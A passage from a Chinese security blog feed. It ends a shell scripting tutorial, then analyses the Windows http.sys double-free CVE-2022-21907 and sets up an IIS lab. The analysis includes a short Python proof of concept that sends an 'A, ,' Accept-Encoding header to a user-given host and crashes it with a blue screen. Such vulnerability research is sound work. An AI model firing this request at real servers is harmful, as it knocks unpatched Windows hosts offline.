true。</td></tr></tbody></table><p>使用如下操作：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">file=&quot;/var/www/runoob/test.sh&quot;</span><br><span class="line">if [ -r $file ]</span><br></pre></td></tr></table></figure><h3 id="二、for语句"><a href="#二、for语句" class="headerlink" title="二、for语句"></a>二、for语句</h3><p>基本没有用…</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">for loop in 1 2 3 4 5</span><br><span class="line">do</span><br><span class="line">    echo &quot;The value is: $loop&quot;</span><br><span class="line">done</span><br></pre></td></tr></table></figure><h3 id="三、while语句"><a href="#三、while语句" class="headerlink" title="三、while语句"></a>三、while语句</h3><p>上实例（用[]也是可以的）</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">int=1</span><br><span class="line">while(( $int&lt;=5 ))</span><br><span class="line">do</span><br><span class="line">    echo $int</span><br><span class="line">    let &quot;int++&quot;</span><br><span class="line">done</span><br></pre></td></tr></table></figure><p><strong>死循环：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">while :</span><br><span class="line">do</span><br><span class="line">    command</span><br><span class="line">done</span><br></pre></td></tr></table></figure><p><strong>break</strong>和 <strong>continue</strong>可以正常使用。</p><h2 id="0x04-函数"><a href="#0x04-函数" class="headerlink" title="0x04 函数"></a>0x04 函数</h2><p><strong>无参函数</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">demoFun()&#123;</span><br><span class="line">    echo &quot;这是我的第一个 shell 函数!&quot;</span><br><span class="line">&#125;</span><br><span class="line">echo &quot;-----函数开始执行-----&quot;</span><br><span class="line">demoFun</span><br><span class="line">echo &quot;-----函数执行完毕-----&quot;</span><br></pre></td></tr></table></figure><p><strong>有参函数</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">funWithParam()&#123;</span><br><span class="line">    echo &quot;第一个参数为 $1 !&quot; #1</span><br><span class="line">    echo &quot;第二个参数为 $2 !&quot; #2</span><br><span class="line">    echo &quot;第十个参数为 $10 !&quot; #10</span><br><span class="line">    echo &quot;第十个参数为 $&#123;10&#125; !&quot; #34</span><br><span class="line">    echo &quot;第十一个参数为 $&#123;11&#125; !&quot; #73</span><br><span class="line">    echo &quot;参数总数有 $# 个!&quot; #11</span><br><span class="line">    echo &quot;作为一个字符串输出所有参数 $* !&quot; #1 2 3 4 5 6 7 8 9 34 73</span><br><span class="line">&#125;</span><br><span class="line">funWithParam 1 2 3 4 5 6 7 8 9 34 73</span><br></pre></td></tr></table></figure><p>如上：$10 不能获取第十个参数，获取第十个参数需要${10}。当n&gt;=10时，需要使用${n}来获取参数！</p><h2 id="0x05-重定向"><a href="#0x05-重定向" class="headerlink" title="0x05 重定向"></a>0x05 重定向</h2><p>先贴规则：（注意要有空格）</p><table><thead><tr><th align="left">命令</th><th align="left">说明</th></tr></thead><tbody><tr><td align="left">command &gt; file</td><td align="left">将标准输出重定向到 file。</td></tr><tr><td align="left">command &lt; file</td><td align="left">将标准输入重定向到 file。</td></tr><tr><td align="left">command &gt;&gt; file</td><td align="left">将标准输出以追加的方式重定向到 file。</td></tr><tr><td align="left">n &gt; file</td><td align="left">将文件描述符为 n 的文件重定向到 file。</td></tr><tr><td align="left">n &gt;&gt; file</td><td align="left">将文件描述符为 n 的文件以追加的方式重定向到 file。</td></tr><tr><td align="left">n &gt;&amp; m</td><td align="left">将输出文件 m 和 n 合并。（基本只用在2&gt;&amp;1，将错误和标准输出合并）</td></tr><tr><td align="left">n &lt;&amp; m</td><td align="left">将输入文件 m 和 n 合并。 （没用）</td></tr><tr><td align="left">&lt;&lt; tag</td><td align="left">将开始标记 tag 和结束标记 tag 之间的内容作为输入。</td></tr></tbody></table><p>​    <strong>需要注意的是文件描述符 0 通常是标准输入（STDIN），1 是标准输出（STDOUT），2 是标准错误输出（STDERR）。</strong></p><p>上面的规则并不难，直接用就可以，主要时对这三个标准的理解。</p><p>一般情况下，每个 Unix/Linux 命令运行时都会打开三个文件：</p><ul><li>标准输入文件(stdin)：stdin的文件描述符为0，Unix程序默认从stdin读取数据。</li><li>标准输出文件(stdout)：stdout 的文件描述符为1，Unix程序默认向stdout输出数据。</li><li>标准错误文件(stderr)：stderr的文件描述符为2，Unix程序会向stderr流中写入错误信息。</li></ul><p><strong>常用</strong>：<em>command &gt; /dev/null 2&gt;&amp;1</em> 来禁止command的所有输出。</p><h2 id="0x06-常用命令"><a href="#0x06-常用命令" class="headerlink" title="0x06 常用命令"></a>0x06 常用命令</h2><p><strong>shell文件包含</strong>，可以引用其他shell文件中的变量，使用：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">source ./otherfile.sh</span><br></pre></td></tr></table></figure><p><strong>echo</strong></p><p>echo默认输出到终端，可以重定向到文件，但是只能覆盖或者加载末尾。</p><p><strong>sed命令</strong></p><ul><li><p><strong>a</strong>  ∶新增， a 的后面可以接字串，而这些字串会在新的一行出现(目前的下一行)。</p></li><li><p><strong>c</strong>  ∶取代， c 的后面可以接字串，这些字串可以取代 n1,n2 之间的行。</p></li><li><p><strong>d</strong>  ∶删除，因为是删除，所以 d 后面通常不接任何内容。</p></li><li><p><strong>i</strong>  ∶插入， i 的后面可以接字串，而这些字串会在新的一行出现(目前的上一行)。</p></li><li><p><strong>p</strong> ∶列印，亦即将某个选择的资料印出。通常 p 会与参数 sed -n 一起运作。</p></li><li><p><strong>s</strong> ∶取代，通常这个 s 的动作可以搭配正则。</p></li></ul><p>举例：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">删除某行</span></span><br><span class="line">sed &#x27;1d&#x27; ab              #删除第一行 </span><br><span class="line">sed &#x27;$d&#x27; ab              #删除最后一行</span><br><span class="line">sed &#x27;1,2d&#x27; ab           #删除第一行到第二行</span><br><span class="line">sed &#x27;2,$d&#x27; ab           #删除第二行到最后一行</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash">显示某行</span></span><br><span class="line">sed -n &#x27;1p&#x27; ab           #显示第一行 </span><br><span class="line">sed -n &#x27;$p&#x27; ab           #显示最后一行</span><br><span class="line">sed -n &#x27;1,2p&#x27; ab        #显示第一行到第二行</span><br><span class="line">sed -n &#x27;2,$p&#x27; ab        #显示第二行到最后一行</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash">使用模式进行查询</span></span><br><span class="line">sed -n &#x27;/ruby/p&#x27; ab    #查询包括关键字ruby所在所有行</span><br><span class="line">sed -n &#x27;/\$/p&#x27; ab        #查询包括关键字$所在所有行，使用反斜线\屏蔽特殊含义</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash">增加一行或多行字符串</span></span><br><span class="line">cat ab</span><br><span class="line">     #Hello!</span><br><span class="line">     #ruby is me,welcome to my blog.</span><br><span class="line">     #end</span><br><span class="line">sed &#x27;1a drink tea&#x27; ab  #第一行后增加字符串&quot;drink tea&quot;</span><br><span class="line">     #Hello!</span><br><span class="line">     #drink tea</span><br><span class="line">     #ruby is me,welcome to my blog. </span><br><span class="line">     #end</span><br><span class="line">sed &#x27;1,3a drink tea&#x27; ab #第一行到第三行后增加字符串&quot;drink tea&quot;</span><br><span class="line">     #Hello!</span><br><span class="line">     #drink tea</span><br><span class="line">     #ruby is me,welcome to my blog.</span><br><span class="line">     #drink tea</span><br><span class="line">     #end</span><br><span class="line">     #drink tea</span><br><span class="line">sed &#x27;1a drink tea\nor coffee&#x27; ab   #第一行后增加多行，使用换行符\n</span><br><span class="line">     #Hello!</span><br><span class="line">     #drink tea</span><br><span class="line">     #or coffee</span><br><span class="line">     #ruby is me,welcome to my blog.</span><br><span class="line">     #end</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash">代替一行或多行</span></span><br><span class="line">sed &#x27;1c Hi&#x27; ab                #第一行代替为Hi</span><br><span class="line">     #Hi</span><br><span class="line">     #ruby is me,welcome to my blog.</span><br><span class="line">     #end</span><br><span class="line">sed &#x27;1,2c Hi&#x27; ab             #第一行到第二行代替为Hi</span><br><span class="line">     #Hi</span><br><span class="line">     #end</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash">替换一行中的某部分</span></span><br><span class="line"><span class="meta">#</span><span class="bash">格式：sed <span class="string">&#x27;s/要替换的字符串/新的字符串/g&#x27;</span>   （要替换的字符串可以用正则表达式）</span></span><br><span class="line">sed -n &#x27;/ruby/p&#x27; ab | sed &#x27;s/ruby/bird/g&#x27;    #替换ruby为bird</span><br><span class="line">sed -n &#x27;/ruby/p&#x27; ab | sed &#x27;s/ruby//g&#x27;        #删除ruby</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash">插入</span></span><br><span class="line">sed -i &#x27;$a bye&#x27; ab         #在文件ab中最后一行直接输入&quot;bye&quot;</span><br><span class="line">cat ab</span><br><span class="line">     #Hello!</span><br><span class="line">     #ruby is me,welcome to my blog.</span><br><span class="line">     #end</span><br><span class="line">     #bye</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>cve-2022-21907分析与复现</title>
      <link href="/2022/07/18/cve-2022-21907%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0/"/>
      <url>/2022/07/18/cve-2022-21907%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="cve-2022-21907分析与复现"><a href="#cve-2022-21907分析与复现" class="headerlink" title="cve-2022-21907分析与复现"></a>cve-2022-21907分析与复现</h1><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/microsoft-confirms-windows-10-20h2-2004.png" alt="microsoft-confirms-windows-10-20h2-2004.png"></p><p>​    说实话，我感觉这个漏洞没有exp不是因为没人公开exp，而是这个漏洞压根就是一个拒绝服务漏洞，一个double free还这么苛刻能怎么利用。</p><p>​    还有一件非常重要的事情不是很确定，就是下面复现的这个漏洞到底是cve-2022-21907还是cve-2021-31166呢，似乎互联网上的大部分人都认同cve-2022-21907是一个doublefree的漏洞，其分析也与本文中下文相同，但是方面，极小部分人说这个漏洞应该是一个栈操作的uaf漏洞。其实我个人更偏向后者，也就是实际上下文中复现的漏洞是cve-2021-31166，因为这个漏洞的调用栈和31166都完全一致，同时31166的poc也能在这个漏洞的环境下跑通（那么微软上一个补丁是怎么打的呢，让人费解）。</p><p>​    总的来说，既然cve<a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-21907">官方</a>给出的参考链接里，信息也与本文复现结果类似，就暂且认为他是21907吧…</p><h2 id="0x01-基本概况"><a href="#0x01-基本概况" class="headerlink" title="0x01 基本概况"></a>0x01 基本概况</h2><p>​    cve-2022-21907为 http.sys 的远程代码执行的漏洞（CVE-2022-21907），攻击者可以在未授权的情况下发出特定的 HTTP 请求达成缓冲区溢出攻击，触发此漏洞。目前受影响的 Windows版本大多是20H1及21H1系列，范围比较广。攻击者通过向Web服务器（如局域网中搭建的IIS 服务器）发送特定格式的HTTP数据包，轻则使靶机蓝屏重启，重则从而能在目标系统上执行任意代码。 该漏洞被微软提示为“可蠕虫化”，即无需用户手动交互便可通过网络进行自我传播。</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220713143654275.png" alt="image-20220713143654275"></p><h2 id="0x02-漏洞背景知识"><a href="#0x02-漏洞背景知识" class="headerlink" title="0x02 漏洞背景知识"></a>0x02 漏洞背景知识</h2><h3 id="一、http-sys"><a href="#一、http-sys" class="headerlink" title="一、http.sys"></a>一、http.sys</h3><p>​    首先介绍出现漏洞的模块：http.sys。</p><p>​    自IIS6.0版本开始，微软公司为了优化Windows平台上的IIS服务器，引入了http.sys这一内核驱动程序。在http.sys未出现的更早版本，对用户http请求进行监听的功能是集成在Inetinfo.exe中的，与此同时，一部分用户的代码也通过该进程进行运行，这导致由于用户代码的不稳定性，可能导致系统进程的崩溃。为了解决这一问题，http.sys模块作为运行在内核模式下与用户模式的接口模块，有效的隔离了系统进程和用户代码，有效的提高了操作系统的稳定性。进一步的，http.sys提供了HTTP请求的接收与响应、快速缓存、提高性能、日志等功能服务，简言之，http.sys作为内核态的接口，与用户态W3Wp.exe等程序进行交互，其最主要的功能有二：</p><ol><li>Kernel mode request queuing（内核模式请求队列）</li><li>Kernel-mode caching （内核模式缓存）</li></ol><p>​    通过下图，对这两个功能进行解释：</p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/http.sys2.drawio.png" alt="http.sys1.drawio" style="zoom:67%;" /><p>​    如上图所示，当请求抵达终端，数据通过TCPIP.sys进行网络层数据报文的解析，而后进入http.sys，在Parse中，回味http请求根据URL添加句柄，对其进行标记，并根据句柄维护一个对应URL句柄的命名空间，命名空间会将请求分发至对应的请求队列（Requset Queue）中，进一步地，通过http.sys与用户态应用程序进行交互，这即是上文中提到的内核模式请求队列功能。</p><p>​    另一方面，考虑到web网站有时会频繁出现重复的http请求，对应相同的http响应，http.sys维护了对应的响应缓存池，当用户对重复的资源进行请求时，请求信息通过HttpEngine直接向ResponseCache缓存池发送请求，并直接将响应结果发送给用户。这一过程从用户发送http请求到系统返回响应结果的一过程都是通过http.sys在内核模式下完成的，不需要在内核模式和用户模式下切换，极大的节省了系统资源，提高响应速度，这即是上文中提到的内核模式缓存功能。</p><p>​    上述http.sys在系统中的位置为：C://windows/system32/drivers/http.sys。</p><h3 id="二、Accept-Encoding"><a href="#二、Accept-Encoding" class="headerlink" title="二、Accept Encoding"></a>二、Accept Encoding</h3><p>​    Accept Encoding 是http请求头中的一个字段，与之对应的是http响应头中的字段Content Encoding，二者均用于表示传输内容编码的压缩情况，Accept Encoding首部字段用来告知服务器用户代理支持的内容编码及内容编码的优先级顺序，因此Accept Encoding可带有多种编码类型，如常见的Chrome浏览器一般会使用：</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220718100254138.png" alt="image-20220718100254138"></p><p>​    意为浏览器支持对gzip、deflate、br三种编码方式的解析，且优先希望得到gzip格式压缩的响应。</p><h2 id="0x03-漏洞原理分析"><a href="#0x03-漏洞原理分析" class="headerlink" title="0x03 漏洞原理分析"></a>0x03 漏洞原理分析</h2><h3 id="一、确定出错位置"><a href="#一、确定出错位置" class="headerlink" title="一、确定出错位置"></a>一、确定出错位置</h3><p>​    要对此漏洞进行溯源，需使用Windows产生蓝屏错误后生成的.dmp文件分析堆栈，其中复现部分可参见下一模块。</p><p>​    获取dump文件后，使用windbg软件进行分析，可得结果如下：</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220715152716659.png" alt="image-20220715152716659"></p><p>​    其中，应重点关注崩溃前产生的栈信息：</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220715152849828.png" alt="image-20220715152849828"></p><p>​    如图所示，最终出错的函数定位在ULFreeUnknownCodingList函数的第0x063行，借助静态分析工具对源代码进行查看对应函数基地址+0x63，即0x01C013F4D4+0x63=0x01C013F537处，显示如下：</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220715153357517.png" alt="image-20220715153357517"></p><p>​    或者，可关注Windbg分析dmp文件Note部分，其显示了报错时的寄存器情况以及报错语句情况，与上述使用静态分析工具查看的结果相同，如下图：</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220715153807070.png" alt="image-20220715153807070"></p><p>​    int 29指令时微软从 Win8 开始引入的一个新的中断序号，用来快速抛出异常，如果中断发生在 Ring0 （内核态）中，操作系统会抛出一个 KERNEL_SECURITY_CHECK_FAILURE (0x139) 的蓝屏信息，并终止当前程序运行。</p><p>​    使用静态分析工具对报错函数UlFreeUnknownCodingList进行反汇编，并对其中重要变量名进行修改，可得到如下的伪代码：</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220715154622176.png" alt="image-20220715154622176"></p><p>​    其中，函数要进入含有终端指令的分支，即伪代码中的__fastfail分支，需满足标识处的条件，要理解该条件，需要确定此函数的传参和要实现的功能。</p><h3 id="二、UlpParseAcceptEncoding-逻辑分析"><a href="#二、UlpParseAcceptEncoding-逻辑分析" class="headerlink" title="二、UlpParseAcceptEncoding 逻辑分析"></a>二、UlpParseAcceptEncoding 逻辑分析</h3><h4 id="1-构建链表UlFreeUnknownCodingList"><a href="#1-构建链表UlFreeUnknownCodingList" class="headerlink" title="1.构建链表UlFreeUnknownCodingList"></a>1.构建链表UlFreeUnknownCodingList</h4><p>​    根据Windbg中分析崩溃前的调用栈可知，调用 UlFreeUnknownCodingList 的是 UlpParseAcceptEncoding 函数，它会循环解析 Accept-Encoding 中的编码方式，首先通过 UlpParseContentCoding 函数依次获取每个编码信息，如果是支持的编码方式，则设置相应位；如果是 没有被识别出的其他编码方式，则调用 ExAllocatePoolWithTagPriority 函数申请 0x20 字节大小的堆空间来存放这些信息，然后将它们链到 UnknownCodingList 中，其中UnknownCodingList 是一个双向循环链表。如下图所示：</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220715161313443.png" alt="image-20220715161313443"></p><h4 id="2-更换Request链表头"><a href="#2-更换Request链表头" class="headerlink" title="2.更换Request链表头"></a>2.更换Request链表头</h4><p>​    上述构建链表过程通过循环调用，直到获取完所有编码后，会进入一个判断分支，除非UnknownCodingList 不为空且链头前后链接无异常，就会将 UnknownCodingListHead 取下，然后把 RequestUnknownCodingListHead 链入。简言之，对链表进行校验后，若无错误则更换链头进入下一步逻辑，如下图所示：</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220715162214553.png" alt="image-20220715162214553"></p><p>​    对其判断逻辑进行整理，可获得逻辑如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//*************如果满足以下任意条件，则会调用 __fastfail(3u)*************</span></span><br><span class="line"><span class="comment">//校验 UnknownCodingListHead 前后关系</span></span><br><span class="line">UnknownCodingListHead.Flink-&gt;Blink != &amp;UnknownCodingListHead</span><br><span class="line">UnknownCodingListHead.Blink-&gt;Flink != &amp;UnknownCodingListHead</span><br><span class="line"><span class="comment">//将 UnknownCodingListHead 取下</span></span><br><span class="line">UnknownCodingListHead.Blink-&gt;Flink = UnknownCodingListHead.Flink</span><br><span class="line">UnknownCodingListHead.Flink-&gt;Blink = UnknownCodingListHead.Blink</span><br><span class="line"><span class="comment">//判断 RequestUnknownCodingListHead 是否为空</span></span><br><span class="line">Request-&gt;UnknownCodingListHead.Flink-&gt;Blink != &amp;Request-&gt;UnknownCodingListHead</span><br><span class="line">Request-&gt;UnknownCodingListHead.Blink-&gt;Flink != &amp;Request-&gt;UnknownCodingListHead</span><br><span class="line"><span class="comment">//校验 UnknownCodingListHead-&gt;Flink 前后关系</span></span><br><span class="line">UnknownCodingListHead-&gt;Flink-&gt;Flink-&gt;Blink != UnknownCodingListHead-&gt;Flink</span><br><span class="line">UnknownCodingListHead-&gt;Blink-&gt;Flink != UnknownCodingListHead-&gt;Flink</span><br><span class="line"><span class="comment">//***********判断条件通过之后，将 RequestUnknownCodingListHead 链进去***********</span></span><br><span class="line">Request-&gt;UnknownCodingListHead.Blink-&gt;Flink = UnknownCodingListHead-&gt;Flink</span><br><span class="line">Request-&gt;UnknownCodingListHead.Blink = UnknownCodingListHead.Flink-&gt;Blink</span><br><span class="line">UnknownCodingListHead.Flink-&gt;Blink-&gt;Flink = &amp;Request-&gt;UnknownCodingListHead</span><br><span class="line">UnknownCodingListHead.Flink-&gt;Blink = Request-&gt;UnknownCodingListHead.Blink</span><br></pre></td></tr></table></figure><p>​    在上一步更换链头的过程中，虽然已经将链表头由UnknownCodingListHead更换为Request-&gt;UnknownCodingListHead，但是但并没有 UnknownCodingListHead 将清空，通过 UnknownCodingListHead 还是可以访问 UnknownCodingListHead-&gt;Flink 和 UnknownCodingListHead-&gt;Blink，即，UnknownCodingListHead 中依然保留可以操控原来链表的指针，其数据可表现为如下情况。</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/cve-2022-21907.drawio.png" alt="cve-2022-21907.drawio"></p><p>​    如上图所示，图中每个节点左右侧箭头分别为节点前后节点的指针，即在更换链表头后，未将UnknownCodingListHead置0。</p><h4 id="3-v5参数判定"><a href="#3-v5参数判定" class="headerlink" title="3.v5参数判定"></a>3.v5参数判定</h4><p>​    在此之后，程序进入判断逻辑，判断 v5 是否小于 0，是则跳到 LABEL_33：</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220718103758756.png" alt="image-20220718103758756"></p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220718104149353.png" alt="image-20220718104149353"></p><p>​    LABEL_33 处会判断 UnknownCodingList 是否为空，如果不为空就调用 UlFreeUnknownCodingList 函数，且参数为 &amp;UnknownCodingListHead。由于 UnknownCodingListHead 已经不在循环双链表中，按照这个流程 对 UnknownCodingList 进行释放就会出现doublefree的问题。</p><p>​    因此，要触发此漏洞，要使得v5的值小于0，通过对于v5进行溯源，如下图所示：</p><p>​    v5作为函数UlpParseContentCoding的返回值，若 v5 小于 0 且不等于 0xC0000225，则逻辑转移至 LABEL_46，这会进一步导致程序逻辑跳过将 RequestUnknownCodingListHead 链进链表的过程，在 UlFreeUnknownCodingList 函数中释放 UnknownCodingList 时，不会出现doublefree问题。</p><p>​    另一方面，如果进入下面第二个条件判断，即满足!v9==1条件，也就意味着 UnknownCodingList 为空。这会导致程序逻辑跳转到LABEL_25，也不会对UlFreeUnknownCodingList 函数进行调用。</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220718104556497.png" alt="image-20220718104556497"></p><p>​    综上，只有当 v5 为 0xC0000225，且UnknownCodingList 不为空时，才会进行前文中分析的链表操作，且在最后判断 v5 &lt; 0 后，跳到 LABEL_30 去执行 UlFreeUnknownCodingList 函数，于是就引起了double free。</p><h3 id="三、漏洞触发条件分析"><a href="#三、漏洞触发条件分析" class="headerlink" title="三、漏洞触发条件分析"></a>三、漏洞触发条件分析</h3><p>​    上文中提到，只有使得v5，也就是UlpParseContentCoding函数的返回值等于0xC0000225，才能使得程序进入漏洞触发逻辑，下面将对UlpParseContentCoding函数逻辑进行分析：</p><p>​    函数逻辑复杂，但返回值为v13，如下图所示</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220718112151428.png" alt="image-20220718112151428"></p><p>​    因此可对v13变量进行追踪，在函数逻辑中，v9通过参数a2进行赋值，如下图所示，而通过对HttpChars中的空格内容进行判断，进而对于v9进行自减操作：</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220718112838713.png" alt="image-20220718112838713"></p><p><img src="C:\Users\86183\AppData\Roaming\Typora\typora-user-images\image-20220718113209474.png" alt="image-20220718113209474"></p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220718112913503.png" alt="image-20220718112913503"></p><p>​    最终，当v9的值为0时，将返回值v13赋值为0xc0000225，并跳转至返回逻辑。综上，在函数UlpParseContentCoding中，v9=a2-空格数量。</p><p>​    向函数外溯源传参a2可知，a2为当前解析剩余长度，因此要使得v9的值为0，可将最后一个参数设定为空格，在进入UlpParseContentCoding后，a2的值为1，v9会被赋值为1，通过循环自减后，使得v9的值为0。使得上图判断条件成立后，作为函数返回值的参数v13会被进一步赋值为0xc0000225，最终使得程序进入doublefree的漏洞分支逻辑。</p><h2 id="0x04-脚本编写"><a href="#0x04-脚本编写" class="headerlink" title="0x04 脚本编写"></a>0x04 脚本编写</h2><h3 id="一、简单脚本编写"><a href="#一、简单脚本编写" class="headerlink" title="一、简单脚本编写"></a>一、简单脚本编写</h3><p>​    如上文所述，只需要使用脚本修改http请求的请求头中的Accept Encoding字段，即可触发系统对于doublefree的检测机制，最终导致蓝屏，根据上文的分析，可得脚本如下所示：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"> </span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Please input your host...\n&quot;</span>)</span><br><span class="line">host = <span class="built_in">input</span>()</span><br><span class="line"> </span><br><span class="line">poc = requests.get(<span class="string">f&#x27;http://<span class="subst">&#123;host&#125;</span>/&#x27;</span>, headers = &#123;<span class="string">&#x27;Accept-Encoding&#x27;</span>: <span class="string">&#x27;A, ,&#x27;</span>,&#125;)</span><br></pre></td></tr></table></figure><h3 id="二、exp实现思路"><a href="#二、exp实现思路" class="headerlink" title="二、exp实现思路"></a>二、exp实现思路</h3><h2 id="0x05-环境搭建"><a href="#0x05-环境搭建" class="headerlink" title="0x05 环境搭建"></a>0x05 环境搭建</h2><h3 id="一、本地搭建http服务"><a href="#一、本地搭建http服务" class="headerlink" title="一、本地搭建http服务"></a>一、本地搭建http服务</h3><p>1.在控制面板→程序→启用和关闭windows功能中启用网络服务功能如下，点击确定。</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220718123707493.png" alt="image-20220718123707493"></p><p>2.打开IIS管理器，点击“内容视图”，“网站”，进入如下界面。</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220718123834265.png" alt="image-20220718123834265"></p><p>3.选择默认网页，点击右侧操作栏的浏览按钮。</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220718123911795.png" alt="image-20220718123911795"></p><p>4.浏览器弹出如下窗口，访问成功，说明成功在本地部署http服务。</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220718131524492.png" alt="image-20220718131524492"></p><h3 id="二、开启蓝屏日志储存功能"><a href="#二、开启蓝屏日志储存功能" class="headerlink" title="二、开启蓝屏日志储存功能"></a>二、开启蓝屏日志储存功能</h3><p>1.进入计算机设置，点击“高级系统设置”</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220718131752652.png" alt="image-20220718131752652"></p><p>2.在“高级”一栏中点击“启动和故障恢复”右侧的“设置”</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220718131957730.png" alt="image-20220718131957730"></p><p>3.在启动和故障恢复中，选择小内存转储，设置转储目录如下图所示。</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220718132055910.png" alt="image-20220718132055910"></p><p>4.通过poc脚本触发漏洞，导致靶机蓝屏后，可在靶机“C:\\Windows\Minidump”文件夹中，观察到出现了如下文件：</p><p><img 